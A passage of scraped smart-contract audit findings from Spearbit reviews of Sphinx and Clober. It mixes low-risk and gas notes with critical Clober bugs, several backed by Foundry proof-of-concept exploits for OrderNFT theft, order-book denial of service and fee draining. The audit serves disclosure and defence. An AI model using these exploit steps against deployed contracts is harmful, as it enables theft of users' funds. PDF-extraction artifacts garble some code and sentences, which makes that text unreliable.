        "body": "The properties of networkDeploymentData are not guaranteed to conform to SphinxTransaction.",
        "labels": [
            "Spearbit",
            "Sphinx",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "3rd merkle tree invariant isn't checked when generating merkle tree",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sphinx-Spearbit-Security-Review.pdf",
        "body": "The 3rd invariant stated in the merkle tree specification:   If ,! arbitraryChain the entire tree, and no is true in *any*   CANCEL leaves   APPROVE leaf, then there must be exactly one APPROVE leaf in   isn't checked when generating the merkle tree, thus leading to possible violations of this invariant.",
        "labels": [
            "Spearbit",
            "Sphinx",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "The execute function does not handle the return data",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sphinx-Spearbit-Security-Review.pdf",
        "body": "When an EXECUTE leaf is executed, the Gnosis Safe function execTransactionFromModule is called. This function handles only success/revert state of a function which means, if an action fails silently (meaning that it returns a false as a bool for example) the action will be marked as success within the SphinxModule. The Gnosis Safe module has also a function called execTransactionFromModuleReturnData which also returns the data that the transaction returns. This can be used to expand the functionality of the current SphinxModule to handle also the silent reverts.",
        "labels": [
            "Spearbit",
            "Sphinx",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "The EIP-712 domain separator is missing the version field",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sphinx-Spearbit-Security-Review.pdf",
        "body": "The EIP-712 domain separator is used to uniquely for hashing and signing of typed structured data as opposed to just bytestrings. In the EIP there are various attributes that should be incorporated in the signature. The implementation in the Sphinx Module is missing to encode some of these attributes like:  Version.  Verifying contract.  Chain id. We do understand why chain id and verifying contract where not implemented due to one signature being used for multiple deployments on multiple chains, we do consider that the version is critical to be implemented in case a new versions of the SphinxModule is developed, the signatures meant for one version can be reused for other versions as well.",
        "labels": [
            "Spearbit",
            "Sphinx",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "OpenZeppelin library leaves sorting differs from 9th merkle tree invariant",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sphinx-Spearbit-Security-Review.pdf",
        "body": "@openzeppelin/merkle-tree is used to assemble the Merkle tree. leaves according to their hashes then stored starting from the last slot in the tree array. Its implementation sorts the export function makeMerkleTree(leaves: Bytes[]): Bytes[] { leaves.forEach(checkValidMerkleNode); if (leaves.length === 0) { throw new Error( }  Expected non-zero number of leaves );  const tree = new Array<Bytes>(2 * leaves.length - 1); for (const [i, leaf] of leaves.entries()) { tree[tree.length - 1 - i] = leaf; } for (let i = tree.length - 1 - leaves.length; i >= 0; i--) { tree[i] = hashPair( tree[leftChildIndex(i)]!, tree[rightChildIndex(i)]!, ); } return tree; } This likely runs contrary to the 9th high-level merkle tree invariant: Merkle tree leaves must be ordered in the tree by the leaf's index and chainId fields ascending.",
        "labels": [
            "Spearbit",
            "Sphinx",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Removing unnecessary reads of known variables will save gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sphinx-Spearbit-Security-Review.pdf",
        "body": "The variable leafSafeProxy is decoded from leaf.data and is subsequently checked to ensure it matches safeProxy. Later, within the same function, safeProxy is used leading to an unnecessary storage read operation, as the value of safeProxy is already accesible at leafSafeProxy.",
        "labels": [
            "Spearbit",
            "Sphinx",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Caching variables accessed multiple times will save gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sphinx-Spearbit-Security-Review.pdf",
        "body": "Caching variables that are accessed multiple times within the same function (i.e. activeMerkleRoot) will save gas, as each access to a state variable like activeMerkleRoot requires a storage read (SLOAD).  activeMerkleRoot at SphinxModule.sol#L273-L403 can be stored in a local variable at the start of execute function.  state.arbitraryChain at SphinxModule.sol#L306-L312 can be stored in a local variable at L305.  state.leavesExecuted can be stored in a local variable at the very beginning of execute and just update it at the very end SphinxModule.sol#L285-L399.",
        "labels": [
            "Spearbit",
            "Sphinx",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "msg.sender is cheaper gas-wise and provides more clarity than the executor variable",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sphinx-Spearbit-Security-Review.pdf",
        "body": "The executor local variable is used in several places after verifying that executor is equal to msg.sender. require(executor == msg.sender, \"SphinxModule: caller isn  t executor\"); Using a local variable for the executor when it equals msg.sender is inefficient. Additionally, using msg.sender provides more clarity on what is going on in the contract logic.",
        "labels": [
            "Spearbit",
            "Sphinx",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "SphinxMerkleRootApproved event can avoid reading from the state",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sphinx-Spearbit-Security-Review.pdf",
        "body": "The SphinxMerkleRootApproved event uses a couple of state parameters, namely merkleRootNonce and activeMerkleRoot, that can be replaced with its user specified counterparts. This is due to having a couple of previous require checks: SLOAD require(activeMerkleRoot == bytes32(0), \"SphinxModule: active merkle root\"); // @audit activeMerkleRoot ,! // ... require(leafMerkleRootNonce == merkleRootNonce, \"SphinxModule: invalid nonce\"); //@audit ,! merkleRootNonce SLOAD This leads to a couple of optimizations 1. Avoid using merkleRootNonce: Reading leafMerkleRootNonce will avoid reading from state and provide the same value. 2. Avoid using activeMerkleRoot: Given the check require(activeMerkleRoot == bytes32(0), \"Sphinx- Module: active merkle root\"); earlier in the code, activeMerkleRoot can be replaced with bytes32(0) or removed entirely from the event parameters.",
        "labels": [
            "Spearbit",
            "Sphinx",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Reordering require statements can save gas in case of revert",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sphinx-Spearbit-Security-Review.pdf",
        "body": "The order of condition checks can be optimized for gas usage. Specifically, checks for input parame- ters should precede checks that require state variable loading (SLOAD). Loading state variables is a more expensive operation compared to checking input parameters.",
        "labels": [
            "Spearbit",
            "Sphinx",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "merkleRootNonce increment can be gas optimized and avoid a SLOAD",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sphinx-Spearbit-Security-Review.pdf",
        "body": "merkleRootNonce is incremented using += 1 operation in approve and cancel functions. Using an unchecked { ++merkleRootNonce; } can offer gas savings as it not expectable to ever overflow. Additionally, leafMerkleRootNonce is equivalent to merkleRootNonce as per the previous require statement, there- fore an extra SLOAD can be avoided by using the local variable leafMerkleRootNonce to calculate the final value.",
        "labels": [
            "Spearbit",
            "Sphinx",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Custom errors can be used for gas savings",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sphinx-Spearbit-Security-Review.pdf",
        "body": "require/revert statements with string messages. Since Solidity 0.8.4, the use of custom errors has been encouraged for gas optimization. Custom errors consume less gas compared to traditional error messages, especially when the same error message is repeated across various functions.",
        "labels": [
            "Spearbit",
            "Sphinx",
            "Severity: Gas Optimization ManagedService.sol#L33, ManagedService.sol#L51, ManagedService.sol#L52, ManagedSer-"
        ]
    },
    {
        "title": "Duplicate _safeProxy zero address check",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sphinx-Spearbit-Security-Review.pdf",
        "body": "The zero address check on _safeProxy is redundant because it will be checked when initializing SphinxModule. require(_safeProxy != address(0), \"SphinxModule: invalid Safe address\");",
        "labels": [
            "Spearbit",
            "Sphinx",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Redundant variable setters",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sphinx-Spearbit-Security-Review.pdf",
        "body": "There is no difference between the old and new values set in the referenced lines. Therefore, they are redundant and can be removed.",
        "labels": [
            "Spearbit",
            "Sphinx",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "OpenZeppelin's StandardMerkleTree allows creating trees with leaves that carry the same informa- tion",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sphinx-Spearbit-Security-Review.pdf",
        "body": "It is possible to create a tree with multiple leaves that would carry the same raw information when one is using OpenZeppelin's StandardMerkleTree. This does not create any issues when one queries the proof, but the queried proof picks the path for the last leaf in the leaf array that carries the same information. leafHash(leaf: T): string { return hex(standardLeafHash(leaf, this.leafEncoding)); } leafLookup(leaf: T): number { return this.hashLookup[this.leafHash(leaf)] ?? throwError(  Leaf is not in tree  ); } getProof(leaf: number | T): string[] { // input validity const valueIndex = typeof leaf === this.validateValue(valueIndex);   number ? leaf : this.leafLookup(leaf); // rebuild tree index and generate proof const { treeIndex } = this.values[valueIndex]!; const proof = getProof(this.tree, treeIndex); // sanity check proof if (!this._verify(this.tree[treeIndex]!, proof)) { Unable to prove value );  throw new Error( }  // return proof in hex format return proof.map(hex); } This is due to the fact hex(standardLeafHash(value, leafEncoding)). that this.hashLookup only saves the last valueIndex for the same",
        "labels": [
            "Spearbit",
            "Sphinx",
            "Severity: Informational"
        ]
    },
    {
        "title": "Mixed usage of uint256 and uint",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sphinx-Spearbit-Security-Review.pdf",
        "body": "There is mixed usage of uint and uint256 within the file.",
        "labels": [
            "Spearbit",
            "Sphinx",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use common base type check function",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sphinx-Spearbit-Security-Review.pdf",
        "body": "The type check logic is reused twice unnecessarily.",
        "labels": [
            "Spearbit",
            "Sphinx",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use onlyRole modifier in MangedService",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sphinx-Spearbit-Security-Review.pdf",
        "body": "The following check could be simplified with the onlyRole modifier provided in AccessControl.sol. Additionally, this would allow meta transactions to be used, as it uses _msgSender() rather than msg.sender: require(hasRole(RELAYER_ROLE, msg.sender), \"ManagedService: invalid caller\");",
        "labels": [
            "Spearbit",
            "Sphinx",
            "Severity: Informational"
        ]
    },
    {
        "title": "Redundant explicit boolean comparisons",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sphinx-Spearbit-Security-Review.pdf",
        "body": "Since arbitraryApprovalIncluded and data.arbitraryChain are booleans, their explicit compar- isons are redundant.",
        "labels": [
            "Spearbit",
            "Sphinx",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider adding more documentation to exec function and its arbitrary external call",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sphinx-Spearbit-Security-Review.pdf",
        "body": "The exec function includes an arbitrary external call. This raises many questions and thus, requires extra documentation for the sake of clarity. Especially, regarding one of the following questions: Is expected to call only deployed smart contracts or also EOA? We expect only to call contracts. Sphinx-Labs -  The function not only allows to make arbitrary external calls to contracts, but to EOAs. Consider documenting this or adding a check for <address>.code.length > 0 to avoid EOAs.  In order to explicitly indicate that _to is intended to receive Ether, consider marking the _to input parameter It won't change the current behavior, however, is enhances readability as it clearly highlights as payable. that the address can handle Ether transactions.",
        "labels": [
            "Spearbit",
            "Sphinx",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use the already defined DEFAULT_ADMIN_ROLE rather than bytes32(0) for consistency",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sphinx-Spearbit-Security-Review.pdf",
        "body": "The contract currently uses a direct bytes32(0) value to represent the default admin role. However, OpenZeppelin's Access Control provides a named constant DEFAULT_ADMIN_ROLE for this purpose. Using this constant enhances code readability and maintainability.",
        "labels": [
            "Spearbit",
            "Sphinx",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unnecesary castings can be removed for consistency and clarity",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sphinx-Spearbit-Security-Review.pdf",
        "body": "At SphinxModuleProxyFactory.sol, SPHINX_MODULE_IMPL is address type, however, it is casted to address at: Clones.predictDeterministicAddress(addres(SPHINX_MODULE_IMPL), salt, MODULE_FACTORY); This issue is also found in a similar instance of Clones.cloneDeterministic.",
        "labels": [
            "Spearbit",
            "Sphinx",
            "Severity: Informational"
        ]
    },
    {
        "title": "Safe owners only sign a typed data hash for the root of a merkle tree and might not know the leaf information",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sphinx-Spearbit-Security-Review.pdf",
        "body": "When a set of leaves are used to construct a merkle tree for the Sphinx protocol, the users would only sign the root and only the root of this tree is used in the EIP-712 typed data signing, i.e., the wallet UIs would only show the root information. The safe owners might get phished into signing a malicious root allowing malicious transactions being executed through the Sphinx proxy module. Creating a different typed structured data for the signing mechanism such as: SphinxMerkleTree { SphinxLeaf[] leaves; } and signing and verifying above on-chain might be expensive for the approve endpoint.",
        "labels": [
            "Spearbit",
            "Sphinx",
            "Severity: Informational"
        ]
    },
    {
        "title": "Typographical issues",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sphinx-Spearbit-Security-Review.pdf",
        "body": "Various typos have been identified throughout the SphinxModule contract.  SphinxModule.sol#L125: - ...because there must always at least be an APPROVE + ...because there must always be an   APPROVE leaf.   leaf.  SphinxModule.sol#L134: - // We don + // We don   t validate the t validate the     uri uri because it we allow it to be empty. because we allow it to be empty.",
        "labels": [
            "Spearbit",
            "Sphinx",
            "Severity: Informational"
        ]
    },
    {
        "title": "Open pragma version is inconsistent and can lead to unexpected behaviors",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sphinx-Spearbit-Security-Review.pdf",
        "body": "The pragma solidity versions specified in various contract files are inconsistent, using a range (>=0.7.0 <0.9.0) rather than a locked version or using an open (cid:2)0.8.0 or (cid:2)0.8.2 version. This can lead to unexpected behaviors if contracts are deployed with different Solidity versions than the specified while testing. foundry.toml file specifies the use of Solidity version 0.8.4, suggesting this as the intended version for contract deployment.",
        "labels": [
            "Spearbit",
            "Sphinx",
            "Severity: Informational"
        ]
    },
    {
        "title": "OrderBook Denial of Service leveraging blacklistable tokens like USDC",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "The issue was spotted while analysing additional impact and fix for 67 Proof of concept checked with the original audit commit: 28062f477f571b38fe4f8455170bd11094a71862 and the newest available commit from dev branch: 2ed4370b5de9cec5c455f5485358db194f093b01 Due to the architecture decision which implements orders queue as a cyclic buffer the OrderBook after reaching MAX_ORDERS (~32k) for a given price point, starts to overwrite stale orders. If an order was never claimed or it is broken, so it cannot be claimed, it is not possible to place a new order in a queue. This emerges due to a fact that it is not possible to finalize the stale order and deliver the underlying assets, what is done while placing a new and replacing a stale order. Effectively this issue can be used to block the main functionality of the OrderBook, so placing new orders for a given price point. Only a single broken order per price-point is enough to lead to this condition. The issue will not be immediately visible as it requires the cyclic buffer to make a circle and encounter the broken order. The proof of concept in SecurityAuditTests.sol attachment implements a simple scenario where a USDC-like mock token is used: 1. Mallory creates one ASK order at some price point (to sell X base tokens for Y quoteTokens). 2. Mallory transfers ownership of the OrderNFT token to an address which is blacklisted by quoteToken (e.g. USDC) 3. Orders queue implemented as a circular buffer over time overflows and starts replacing old orders. 4. When it is the time to replace the order the quoteToken is about to be transferred, but due to the blacklist the assets cannot be delivered. 5. At this point it is impossible to place new orders at this price index, unless the owner of the OrderNFT transfers it to somebody who can receive quoteToken. Proof of concept result for the newest 2ed4370b5de9cec5c455f5485358db194f093b01 commit: # $ git clone ... && git checkout 2ed4370b5de9cec5c455f5485358db194f093b01 # $ forge test -m \"test_security_BlockOrderQueueWithBlacklistableToken\" [25766] MockOrderBook::limitOrder(0x0000000000000000000000000000000000004444, 3, 0, ,! 333333333333333334, 2, 0x) [8128] OrderNFT::onBurn(false, 3, 0) [1448] MockOrderBook::getOrder((false, 3, 0)) [staticcall]  (1, 0, 0x00000000000000000000000000000000DeaDBeef) emit Approval(owner: 0x00000000000000000000000000000000DeaDBeef, approved: 0x0000000000000000000000000000000000000000, tokenId: 20705239040371691362304267586831076357353326916511159665487572671397888) emit Transfer(from: 0x00000000000000000000000000000000DeaDBeef, to: 0x0000000000000000000000000000000000000000, tokenId: 20705239040371691362304267586831076357353326916511159665487572671397888)  () emit ClaimOrder(claimer: 0x0000000000000000000000000000000000004444, user: 0x00000000000000000000000000000000DeaDBeef, rawAmount: 1, bountyAmount: 0, orderIndex: 0, priceIndex: 3, isBase: false) [714] MockSimpleBlockableToken::transfer(0x00000000000000000000000000000000DeaDBeef, 10000) ,! ,! ,! ,! ,! ,!  \"blocked\"  \"blocked\"  \"blocked\" 5 In real life all *-USDC and USDC-* pairs as well as other pairs where a single token implements a block list are affected. The issue is also appealing to the attacker as at any time if the attacker controls the blacklisted wallet address, he/she can transfer the unclaimable OrderNFT to a whitelisted address to claim his/her assets and to enable processing until the next broken order is placed in the cyclic buffer. It can be used either to manipulate the market by blocking certain types of orders per given price points or simply to blackmail the DAO to resume operations.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "Overflow in SegmentedSegmentTree464",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "SegmentedSegmentTree464.update needs to perform an overflow check in case the new value is greater than the old value. This overflow check is done when adding the new difference to each node in each layer (using addClean). Furthermore, there's a final overflow check by adding up all nodes in the first layer in total(core). However, in total, the nodes in individual groups are added using DirtyUint64.sumPackedUnsafe: function total(Core storage core) internal view returns (uint64) { return DirtyUint64.sumPackedUnsafe(core.layers[0][0], 0, _C) + DirtyUint64.sumPackedUnsafe(core.layers[0][1], 0, _C); } The nodes in a group can overflow without triggering an overflow & revert. The impact is that the order book depth and claim functionalities break for all users. 6 // SPDX-License-Identifier: BUSL-1.1 pragma solidity ^0.8.0; import \"forge-std/Test.sol\"; import \"forge-std/StdJson.sol\"; import \"../../contracts/mocks/SegmentedSegmentTree464Wrapper.sol\"; contract SegmentedSegmentTree464Test is Test { using stdJson for string; uint32 private constant _MAX_ORDER = 2**15; SegmentedSegmentTree464Wrapper testWrapper; function setUp() public { testWrapper = new SegmentedSegmentTree464Wrapper(); } function testTotalOverflow() public { uint64 half64 = type(uint64).max / 2 + 1; testWrapper.update(0, half64); // map to the right node of layer 0, group 0 testWrapper.update(_MAX_ORDER / 2 - 1, half64); assertEq(testWrapper.total(), 0); } }",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "OrderNFT theft due to controlling future and past tokens of same order index",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "The order queue is implemented as a ring buffer, to get an order (Orderbook.getOrder) the index in the queue is computed as orderIndex % _MAX_ORDER. The owner of an OrderNFT also uses this function. function _getOrder(OrderKey calldata orderKey) internal view returns (Order storage) { return _getQueue(orderKey.isBid, orderKey.priceIndex).orders[orderKey.orderIndex & _MAX_ORDER_M]; } CloberOrderBook(market).getOrder(decodeId(tokenId)).owner Therefore, the current owner of the NFT of orderIndex also owns all NFTs with orderIndex + k * _MAX_ORDER. An attacker can set approvals of future token IDs to themself. These approvals are not cleared on OrderNFT.onMint when a victim mints this future token ID, allowing the attacker to steal the NFT and cancel the NFT to claim their tokens. 7 // SPDX-License-Identifier: BUSL-1.1 pragma solidity ^0.8.0; import \"forge-std/Test.sol\"; import \"../../../../contracts/interfaces/CloberMarketSwapCallbackReceiver.sol\"; import \"../../../../contracts/mocks/MockQuoteToken.sol\"; import \"../../../../contracts/mocks/MockBaseToken.sol\"; import \"../../../../contracts/mocks/MockOrderBook.sol\"; import \"../../../../contracts/markets/VolatileMarket.sol\"; import \"../../../../contracts/OrderNFT.sol\"; import \"../utils/MockingFactoryTest.sol\"; import \"./Constants.sol\"; contract ExploitsTest is Test, CloberMarketSwapCallbackReceiver, MockingFactoryTest { struct Return { address tokenIn; address tokenOut; uint256 amountIn; uint256 amountOut; uint256 refundBounty; } struct Vars { uint256 inputAmount; uint256 outputAmount; uint256 beforePayerQuoteBalance; uint256 beforePayerBaseBalance; uint256 beforeTakerQuoteBalance; uint256 beforeOrderBookEthBalance; } MockQuoteToken quoteToken; MockBaseToken baseToken; MockOrderBook orderBook; OrderNFT orderToken; function setUp() public { quoteToken = new MockQuoteToken(); baseToken = new MockBaseToken(); } function cloberMarketSwapCallback( address tokenIn, address tokenOut, uint256 amountIn, uint256 amountOut, bytes calldata data ) external payable { if (data.length != 0) { Return memory expectedReturn = abi.decode(data, (Return)); assertEq(tokenIn, expectedReturn.tokenIn, \"ERROR_TOKEN_IN\"); assertEq(tokenOut, expectedReturn.tokenOut, \"ERROR_TOKEN_OUT\"); assertEq(amountIn, expectedReturn.amountIn, \"ERROR_AMOUNT_IN\"); assertEq(amountOut, expectedReturn.amountOut, \"ERROR_AMOUNT_OUT\"); assertEq(msg.value, expectedReturn.refundBounty, \"ERROR_REFUND_BOUNTY\"); } IERC20(tokenIn).transfer(msg.sender, amountIn); } 8 function _createOrderBook(int24 makerFee, uint24 takerFee) private { orderToken = new OrderNFT(); orderBook = new MockOrderBook( address(orderToken), address(quoteToken), address(baseToken), 1, 10**4, makerFee, takerFee, address(this) ); orderToken.init(\"\", \"\", address(orderBook), address(this)); uint256 _quotePrecision = 10**quoteToken.decimals(); quoteToken.mint(address(this), 1000000000 * _quotePrecision); quoteToken.approve(address(orderBook), type(uint256).max); uint256 _basePrecision = 10**baseToken.decimals(); baseToken.mint(address(this), 1000000000 * _basePrecision); baseToken.approve(address(orderBook), type(uint256).max); } function _buildLimitOrderOptions(bool isBid, bool postOnly) private pure returns (uint8) { return (isBid ? 1 : 0) + (postOnly ? 2 : 0); } uint256 private constant _MAX_ORDER = 2**15; // 32768 uint256 private constant _MAX_ORDER_M = 2**15 - 1; // % 32768 function testExploit2() public { _createOrderBook(0, 0); address attacker = address(0x1337); address attacker2 = address(0x1338); address victim = address(0xbabe); // Step 1. Attacker creates an ASK limit order and receives NFT uint16 priceIndex = 100; uint256 orderIndex = orderBook.limitOrder{value: Constants.CLAIM_BOUNTY * 1 gwei}({ user: attacker, priceIndex: priceIndex, rawAmount: 0, baseAmount: 1e18, options: _buildLimitOrderOptions(Constants.ASK, Constants.POST_ONLY), data: new bytes(0) }); // Step 2. Given the `OrderKey` which represents the created limit order, an attacker can craft ,! ambiguous tokenIds CloberOrderBook.OrderKey memory orderKey = CloberOrderBook.OrderKey({isBid: false, priceIndex: priceIndex, orderIndex: orderIndex}); uint256 currentTokenId = orderToken.encodeId(orderKey); orderKey.orderIndex += _MAX_ORDER; uint256 futureTokenId = orderToken.encodeId(orderKey); // Step 3. Attacker approves the futureTokenId to themself, and cancels the current id vm.startPrank(attacker); orderToken.approve(attacker2, futureTokenId); CloberOrderBook.OrderKey[] memory orderKeys = new CloberOrderBook.OrderKey[](1); orderKeys[0] = orderKey; orderKeys[0].orderIndex = orderIndex; // restore original orderIndex 9 orderBook.cancel(attacker, orderKeys); vm.stopPrank(); // Step 4. attacker fills queue, victim creates their order recycles orderIndex 0 uint256 victimOrderSize = 1e18; for(uint256 i = 0; i < _MAX_ORDER; i++) { orderBook.limitOrder{value: Constants.CLAIM_BOUNTY * 1 gwei}({ user: i < _MAX_ORDER - 1 ? attacker : victim, priceIndex: priceIndex, rawAmount: 0, baseAmount: victimOrderSize, options: _buildLimitOrderOptions(Constants.ASK, Constants.POST_ONLY), data: new bytes(0) }); } assertEq(orderToken.ownerOf(futureTokenId), victim); // Step 5. Attacker steals the NFT and can cancel to receive the tokens vm.startPrank(attacker2); orderToken.transferFrom(victim, attacker, futureTokenId); vm.stopPrank(); assertEq(orderToken.ownerOf(futureTokenId), attacker); uint256 baseBalanceBefore = baseToken.balanceOf(attacker); vm.startPrank(attacker); orderKeys[0].orderIndex = orderIndex + _MAX_ORDER; orderBook.cancel(attacker, orderKeys); vm.stopPrank(); assertEq(baseToken.balanceOf(attacker) - baseBalanceBefore, victimOrderSize); } }",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "OrderNFT theft due to ambiguous tokenId encoding/decoding scheme",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "The encodeId() uniquely encodes OrderKey to a uin256 number. However, decodeId() ambigu- ously can decode many tokenId's to the exact same OrderKey. This can be problematic due to the fact that contract uses tokenId's to store approvals. The ambiguity comes from converting uint8 value to bool isBid value here function decodeId(uint256 id) public pure returns (CloberOrderBook.OrderKey memory) { uint8 isBid; uint16 priceIndex; uint232 orderIndex; assembly { orderIndex := id priceIndex := shr(232, id) isBid := shr(248, id) } return CloberOrderBook.OrderKey({isBid: isBid == 1, priceIndex: priceIndex, orderIndex: orderIndex}); ,! } (note that the attack is possible only for ASK limit orders) 11 Proof of Concept // Step 1. Attacker creates an ASK limit order and receives NFT uint16 priceIndex = 100; uint256 orderIndex = orderBook.limitOrder{value: Constants.CLAIM_BOUNTY * 1 gwei}({ user: attacker, priceIndex: priceIndex, rawAmount: 0, baseAmount: 10**18, options: _buildLimitOrderOptions(Constants.ASK, Constants.POST_ONLY), data: new bytes(0) }); // Step 2. Given the `OrderKey` which represents the created limit order, an attacker can craft ambiguous tokenIds ,! CloberOrderBook.OrderKey memory order_key = CloberOrderBook.OrderKey({isBid: false, priceIndex: priceIndex, orderIndex: orderIndex}); ,! uint256 tokenId = orderToken.encodeId(order_key); uint256 ambiguous_tokenId = tokenId + (1 << 255); // crafting ambiguous tokenId // Step 3. Attacker approves both victim (can be a third-party protocol like OpenSea) and his other account ,! vm.startPrank(attacker); orderToken.approve(victim, tokenId); orderToken.approve(attacker2, ambiguous_tokenId); vm.stopPrank(); // Step 4. Victim transfers the NFT to the themselves. (Or attacker trades it) vm.startPrank(victim); orderToken.transferFrom(attacker, victim, tokenId); vm.stopPrank(); // Step 5. Attacker steals the NFT vm.startPrank(attacker2); orderToken.transferFrom(victim, attacker2, ambiguous_tokenId); vm.stopPrank();",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "Missing owner check on from when transferring tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "The OrderNFT.transferFrom/safeTransferFrom use the internal _transfer function. While they check approvals on msg.sender through _isApprovedOrOwner(msg.sender, tokenId), it is never checked that the specified from parameter is actually the owner of the NFT. An attacker can decrease other users' NFT balances, making them unable to cancel or claim their NFTs and locking users' funds. The attacker transfers their own NFT passing the victim as from by calling transfer- From(from=victim, to=attackerAccount, tokenId=attackerTokenId). This passes the _isApprovedOrOwner check, but reduces from's balance.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Wrong minimum net fee check",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "A minimum net fee was introduced that all markets should comply by such that the protocol earns fees. The protocol fees are computed takerFee + makerFee and the market factory computes the wrong check. Fee pairs that should be accepted are currently not accepted, and even worse, fee pairs that should be rejected are currently accepted. Market creators can avoid collecting protocol fees this way.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Rounding up of taker fees of constituent orders may exceed collected fee",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "If multiple orders are taken, the taker fee calculated is rounded up once, but that of each taken maker order could be rounded up as well, leading to more fees accounted for than actually taken. Example:  takerFee = 100011 (10.0011%)  2 maker orders of amounts 400000 and 377000  total amount = 400000 + 377000 = 777000  Taker fee taken = 777000 * 100011 / 1000000 = 77708.547 = 777709 Maker fees would be 13 377000 * 100011 / 1000000 = 37704.147 = 37705 400000 * 100011 / 1000000 = 40004.4 = 40005 which is 1 wei more than actually taken. Below is a foundry test to reproduce the problem, which can be inserted into Claim.t.sol: function testClaimFeesFailFromRounding() public { _createOrderBook(0, 100011); // 10.0011% taker fee // create 2 orders uint256 orderIndex1 = _createPostOnlyOrder(Constants.BID, Constants.RAW_AMOUNT); uint256 orderIndex2 = _createPostOnlyOrder(Constants.BID, Constants.RAW_AMOUNT); // take both orders _createTakeOrder(Constants.BID, 2 * Constants.RAW_AMOUNT); CloberOrderBook.OrderKey[] memory ids = new CloberOrderBook.OrderKey[](2); ids[0] = CloberOrderBook.OrderKey({ isBid: Constants.BID, priceIndex: Constants.PRICE_INDEX, orderIndex: orderIndex1 }); ids[1] = CloberOrderBook.OrderKey({ isBid: Constants.BID, priceIndex: Constants.PRICE_INDEX, orderIndex: orderIndex2 }); // perform claim orderBook.claim( address(this), ids ); // (uint128 quoteFeeBal, uint128 baseFeeBal) = orderBook.getFeeBalance(); // console.log(quoteFeeBal); // fee accounted = 20004 // console.log(baseFeeBal); // fee accounted = 0 // console.log(quoteToken.balanceOf(address(orderBook))); // actual fee collected = 20003 // try to claim fees, will revert vm.expectRevert(\"ERC20: transfer amount exceeds balance\"); orderBook.collectFees(); }",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Drain tokens condition due to reentrancy in collectFees",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "collectFees function is not guarded by a re-entrancy guard. In case a transfer of at least one of the tokens in a trading pair allows to invoke arbitrary code (e.g. token implementing callbacks/hooks), it is possible for a malicious host to drain trading pools. The re-entrancy condition allows to transfer collected fees multiple times to both DAO and the host beyond the actual fee counter.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Group claim clashing condition",
